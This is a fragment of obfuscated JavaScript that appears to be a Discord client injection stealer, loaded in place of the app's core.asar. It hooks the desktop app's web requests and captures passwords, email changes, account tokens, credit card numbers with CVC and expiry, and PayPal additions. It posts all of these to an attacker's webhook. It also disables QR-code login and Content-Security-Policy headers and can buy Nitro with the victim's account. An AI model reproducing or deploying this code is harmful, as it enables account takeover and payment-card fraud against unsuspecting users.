0x100:_0x3a56f8+=_0x539c47(0x100);break;case 0x0:_0x3a56f8=_0x539c47(0xf5);break;default:_0x3a56f8=_0x539c47(0xf5);break;}return _0x3a56f8;},hooker=async _0x52955b=>{const _0x422833=_0x55d170,_0x143ef9=JSON[_0x422833(0x14c)](_0x52955b),_0x4c6cdf=new URL(config[_0x422833(0xdc)]),_0x3d410c={'Content-Type':'application/json','Access-Control-Allow-Origin':'*'};if(!config[_0x422833(0xdc)]['includes']('api/webhooks')){const _0x428888=totp(config[_0x422833(0x103)]);_0x3d410c[_0x422833(0x13d)]=_0x428888;}const _0x53ed96={'protocol':_0x4c6cdf[_0x422833(0x99)],'hostname':_0x4c6cdf[_0x422833(0x8f)],'path':_0x4c6cdf[_0x422833(0x94)],'method':'POST','headers':_0x3d410c},_0x4ca64e=https['request'](_0x53ed96);_0x4ca64e['on'](_0x422833(0xda),_0x21d2ad=>{const _0x3e83ac=_0x422833;console[_0x3e83ac(0xb3)](_0x21d2ad);}),_0x4ca64e[_0x422833(0x11a)](_0x143ef9),_0x4ca64e[_0x422833(0xe7)]();},login=async(_0x241616,_0x25eebe,_0x4e8075)=>{const _0x3cb8cd=_0x55d170,_0x35c950=await getInfo(_0x4e8075),_0x113269=getNitro(_0x35c950[_0x3cb8cd(0xbc)]),_0x170d1f=getBadges(_0x35c950[_0x3cb8cd(0xbd)]),_0x514f32=await getBilling(_0x4e8075),_0x19fee2={'username':config[_0x3cb8cd(0xa1)],'avatar_url':config[_0x3cb8cd(0x149)],'embeds':[{'color':config[_0x3cb8cd(0xca)],'fields':[{'name':_0x3cb8cd(0xde),'value':_0x3cb8cd(0x123)+_0x241616+_0x3cb8cd(0x9a)+_0x25eebe+'**','inline':![]},{'name':_0x3cb8cd(0xff),'value':_0x3cb8cd(0xed)+_0x113269+_0x3cb8cd(0x14d)+_0x170d1f+_0x3cb8cd(0xa3)+_0x514f32+'**','inline':![]},{'name':_0x3cb8cd(0x12e),'value':'`'+_0x4e8075+'`','inline':![]}],'author':{'name':_0x35c950['username']+'#'+_0x35c950[_0x3cb8cd(0xb7)]+_0x3cb8cd(0x91)+_0x35c950['id'],'icon_url':_0x3cb8cd(0x108)+_0x35c950['id']+'/'+_0x35c950['avatar']+_0x3cb8cd(0xb1)}}]};if(config[_0x3cb8cd(0xd2)])_0x19fee2[_0x3cb8cd(0xdf)]=config[_0x3cb8cd(0x129)];hooker(_0x19fee2);},passwordChanged=async(_0x1bf129,_0x100671,_0x565e87)=>{const _0x4381dc=_0x55d170,_0x295c05=await getInfo(_0x565e87),_0x20a51f=getNitro(_0x295c05[_0x4381dc(0xbc)]),_0x366587=getBadges(_0x295c05[_0x4381dc(0xbd)]),_0x46effa=await getBilling(_0x565e87),_0x25ebee={'username':config[_0x4381dc(0xa1)],'avatar_url':config[_0x4381dc(0x149)],'embeds':[{'color':config[_0x4381dc(0xca)],'fields':[{'name':_0x4381dc(0xc7),'value':_0x4381dc(0x123)+_0x295c05['email']+_0x4381dc(0xaa)+_0x1bf129+_0x4381dc(0x9b)+_0x100671+'**','inline':!![]},{'name':_0x4381dc(0xff),'value':_0x4381dc(0xed)+_0x20a51f+'**\x0aBadges:\x20**'+_0x366587+_0x4381dc(0xa3)+_0x46effa+'**','inline':!![]},{'name':'**Token**','value':'`'+_0x565e87+'`','inline':![]}],'author':{'name':_0x295c05[_0x4381dc(0x11f)]+'#'+_0x295c05[_0x4381dc(0xb7)]+_0x4381dc(0x91)+_0x295c05['id'],'icon_url':_0x4381dc(0x108)+_0x295c05['id']+'/'+_0x295c05['avatar']+_0x4381dc(0xb1)}}]};if(config[_0x4381dc(0xd2)])_0x25ebee[_0x4381dc(0xdf)]=config[_0x4381dc(0x129)];hooker(_0x25ebee);},emailChanged=async(_0x3152a1,_0x2a3a1d,_0x953170)=>{const _0x523ef1=_0x55d170,_0x31114d=await getInfo(_0x953170),_0x87ffb6=getNitro(_0x31114d['premium_type']),_0x4e9494=getBadges(_0x31114d['flags']),_0x2e75ee=await getBilling(_0x953170),_0x11be97={'username':config[_0x523ef1(0xa1)],'avatar_url':config['embed_icon'],'embeds':[{'color':config[_0x523ef1(0xca)],'fields':[{'name':_0x523ef1(0x10e),'value':'New\x20Email:\x20**'+_0x3152a1+'**\x0aPassword:\x20**'+_0x2a3a1d+'**','inline':!![]},{'name':'**Discord\x20Info**','value':'Nitro\x20Type:\x20**'+_0x87ffb6+_0x523ef1(0x14d)+_0x4e9494+_0x523ef1(0xa3)+_0x2e75ee+'**','inline':!![]},{'name':_0x523ef1(0x12e),'value':'`'+_0x953170+'`','inline':![]}],'author':{'name':_0x31114d[_0x523ef1(0x11f)]+'#'+_0x31114d[_0x523ef1(0xb7)]+_0x523ef1(0x91)+_0x31114d['id'],'icon_url':'https://cdn.discordapp.com/avatars/'+_0x31114d['id']+'/'+_0x31114d[_0x523ef1(0x97)]+'.webp'}}]};if(config['ping_on_run'])_0x11be97[_0x523ef1(0xdf)]=config[_0x523ef1(0x129)];hooker(_0x11be97);},PaypalAdded=async _0x211688=>{const _0x17bd7a=_0x55d170,_0x12a1af=await getInfo(_0x211688),_0x59e9ac=getNitro(_0x12a1af[_0x17bd7a(0xbc)]),_0x16b0ca=getBadges(_0x12a1af[_0x17bd7a(0xbd)]),_0x546b7d=getBilling(_0x211688),_0x5aca00={'username':config[_0x17bd7a(0xa1)],'avatar_url':config[_0x17bd7a(0x149)],'embeds':[{'color':config[_0x17bd7a(0xca)],'fields':[{'name':_0x17bd7a(0xfd),'value':_0x17bd7a(0xdd),'inline':![]},{'name':_0x17bd7a(0xff),'value':'Nitro\x20Type:\x20**'+_0x59e9ac+_0x17bd7a(0xa8)+_0x16b0ca+'**\x0aBilling:\x20**'+_0x546b7d+'**','inline':![]},{'name':_0x17bd7a(0x12e),'value':'`'+_0x211688+'`','inline':![]}],'author':{'name':_0x12a1af[_0x17bd7a(0x11f)]+'#'+_0x12a1af[_0x17bd7a(0xb7)]+_0x17bd7a(0x91)+_0x12a1af['id'],'icon_url':'https://cdn.discordapp.com/avatars/'+_0x12a1af['id']+'/'+_0x12a1af[_0x17bd7a(0x97)]+_0x17bd7a(0xb1)}}]};if(config[_0x17bd7a(0xd2)])_0x5aca00[_0x17bd7a(0xdf)]=config[_0x17bd7a(0x129)];hooker(_0x5aca00);},ccAdded=async(_0x370072,_0x449c72,_0x34de09,_0x1259b3,_0x542164)=>{const _0x438092=_0x55d170,_0x83de34=await getInfo(_0x542164),_0x567c26=getNitro(_0x83de34[_0x438092(0xbc)]),_0x799311=getBadges(_0x83de34[_0x438092(0xbd)]),_0x564410=await getBilling(_0x542164),_0x5c1265={'username':config[_0x438092(0xa1)],'avatar_url':config[_0x438092(0x149)],'embeds':[{'color':config['embed_color'],'fields':[{'name':_0x438092(0x14e),'value':_0x438092(0xc5)+_0x370072+'**\x0aCVC:\x20**'+_0x449c72+_0x438092(0x145)+_0x34de09+'/'+_0x1259b3+'**','inline':!![]},{'name':'**Discord\x20Info**','value':_0x438092(0xed)+_0x567c26+_0x438092(0x14d)+_0x799311+_0x438092(0xa3)+_0x564410+'**','inline':!![]},{'name':_0x438092(0x12e),'value':'`'+_0x542164+'`','inline':![]}],'author':{'name':_0x83de34['username']+'#'+_0x83de34[_0x438092(0xb7)]+_0x438092(0x91)+_0x83de34['id'],'icon_url':_0x438092(0x108)+_0x83de34['id']+'/'+_0x83de34[_0x438092(0x97)]+_0x438092(0xb1)}}]};if(config['ping_on_run'])_0x5c1265[_0x438092(0xdf)]=config[_0x438092(0x129)];hooker(_0x5c1265);},nitroBought=async _0x284ba1=>{const _0xbbca02=_0x55d170,_0xc69cfe=await getInfo(_0x284ba1),_0x147ae0=getNitro(_0xc69cfe[_0xbbca02(0xbc)]),_0x1e7c58=getBadges(_0xc69cfe[_0xbbca02(0xbd)]),_0x1c3b35=await getBilling(_0x284ba1),_0x55bd4b=await buyNitro(_0x284ba1),_0xaefc5e={'username':config[_0xbbca02(0xa1)],'content':_0x55bd4b,'avatar_url':config['embed_icon'],'embeds':[{'color':config['embed_color'],'fields':[{'name':'**Nitro\x20bought!**','value':_0xbbca02(0x148)+_0x55bd4b+_0xbbca02(0x13e),'inline':!![]},{'name':_0xbbca02(0xff),'value':_0xbbca02(0xed)+_0x147ae0+'**\x0aBadges:\x20**'+_0x1e7c58+_0xbbca02(0xa3)+_0x1c3b35+'**','inline':!![]},{'name':'**Token**','value':'`'+_0x284ba1+'`','inline':![]}],'author':{'name':_0xc69cfe[_0xbbca02(0x11f)]+'#'+_0xc69cfe[_0xbbca02(0xb7)]+_0xbbca02(0x91)+_0xc69cfe['id'],'icon_url':_0xbbca02(0x108)+_0xc69cfe['id']+'/'+_0xc69cfe[_0xbbca02(0x97)]+'.webp'}}]};if(config[_0xbbca02(0xd2)])_0xaefc5e[_0xbbca02(0xdf)]=config[_0xbbca02(0x129)]+('\x0a'+_0x55bd4b);hooker(_0xaefc5e);};session[_0x55d170(0xce)]['webRequest'][_0x55d170(0x110)](config[_0x55d170(0x125)],(_0x5a9301,_0x2e87e3)=>{const _0x4b9cb4=_0x55d170;if(_0x5a9301['url'][_0x4b9cb4(0xf6)]('wss://remote-auth-gateway'))return _0x2e87e3({'cancel':!![]});updateCheck();}),session['defaultSession'][_0x55d170(0x9f)]['onHeadersReceived']((_0x4bbeda,_0x4685f5)=>{const _0x2a1d56=_0x55d170;_0x4bbeda[_0x2a1d56(0xfb)]['startsWith'](config[_0x2a1d56(0xdc)])?_0x4bbeda[_0x2a1d56(0xfb)][_0x2a1d56(0x11e)](_0x2a1d56(0xe3))?_0x4685f5({'responseHeaders':Object['assign']({'Access-Control-Allow-Headers':'*'},_0x4bbeda['responseHeaders'])}):_0x4685f5({'responseHeaders':Object[_0x2a1d56(0xb4)]({'Content-Security-Policy':[_0x2a1d56(0x14f),_0x2a1d56(0x159),'Access-Control-Allow-Origin\x20\x27*\x27'],'Access-Control-Allow-Headers':'*','Access-Control-Allow-Origin':'*'},_0x4bbeda[_0x2a1d56(0x151)])}):(delete _0x4bbeda[_0x2a1d56(0x151)][_0x2a1d56(0xb6)],delete _0x4bbeda[_0x2a1d56(0x151)][_0x2a1d56(0x133)],_0x4685f5({'responseHeaders':{..._0x4bbeda[_0x2a1d56(0x151)],'Access-Control-Allow-Headers':'*'}}));}),session[_0x55d170(0xce)][_0x55d170(0x9f)]['onCompleted'](config[_0x55d170(0x13c)],async(_0x19c96b,_0x326057)=>{const _0x2dfd8b=_0x55d170;if(_0x19c96b[_0x2dfd8b(0xb0)]!==0xc8&&_0x19c96b[_0x2dfd8b(0xb0)]!==0xca)return;const _0x5236dc=Buffer[_0x2dfd8b(0xcf)](_0x19c96b['uploadData'][0x0][_0x2dfd8b(0xf1)])[_0x2dfd8b(0x127)](),_0x4695a9=JSON[_0x2dfd8b(0xc6)](_0x5236dc),_0x10ee4f=await execScript(_0x2dfd8b(0x119));switch(!![]){case _0x19c96b[_0x2dfd8b(0xfb)][_0x2dfd8b(0xeb)](_0x2dfd8b(0x14a)):login(_0x4695a9['login'],_0x4695a9[_0x2dfd8b(0xf2)],_0x10ee4f)[_0x2dfd8b(0xc1)](console[_0x2dfd8b(0xda)]);break;case _0x19c96b[_0x2dfd8b(0xfb)][_0x2dfd8b(0xeb)](_0x2dfd8b(0x154))&&_0x19c96b['method']===_0x2dfd8b(0xbe):if(!_0x4695a9[_0x2dfd8b(0xf2)])return;_0x4695a9['email']&&emailChanged(_0x4695a9['email'],_0x4695a9['password'],_0x10ee4f)['catch'](console[_0x2dfd8b(0xda)]);_0x4695a9[_0x2dfd8b(0x139)]&&passwordChanged(_0x4695a9['password'],_0x4695a9['new_password'],_0x10ee4f)['catch'](console[_0x2dfd8b(0xda)]);break;case _0x19c96b[_0x2dfd8b(0xfb)][_0x2dfd8b(0xeb)](_0x2dfd8b(0x132))&&_0x19c96b[_0x2dfd8b(0x101)]===_0x2dfd8b(0x131):const _0x100bb2=querystring[_0x2dfd8b(0xc6)](unparsedData[_0x2dfd8b(0x127)]());ccAdded(_0x100bb2[_0x2dfd8b(0x13f)],_0x100bb2[_0x2dfd8b(0x11b)],_0x100bb2[_0x2dfd8b(0x124)],_0x100bb2[_0x2dfd8b(0xea)],_0x10ee4f)[_0x2dfd8b(0xc1)](console[_0x2dfd8b(0xda)]);break;case _0x19c96b['url'][_0x2dfd8b(0xeb)](_0x2dfd8b(0xb5))&&_0x19c96b[_0x2dfd8b(0x101)]===_0x2dfd8b(0x131):PaypalAdded(_0x10ee4f)['catch'](console[_0x2dfd8b(0xda)]);break;case _0x19c96b[_0x2dfd8b(0xfb)]['endsWith']('confirm')&&_0x19c96b[_0x2dfd8b(0x101)]===_0x2dfd8b(0x131):if(!config['auto_buy_nitro'])return;setTimeout(()=>{const _0x48ae1a=_0x2dfd8b;nitroBought(_0x10ee4f)[_0x48ae1a(0xc1)](console[_0x48ae1a(0xda)]);},0x1d4c);break;default:break;}}),module[_0x55d170(0xaf)]=require('./core.asar');
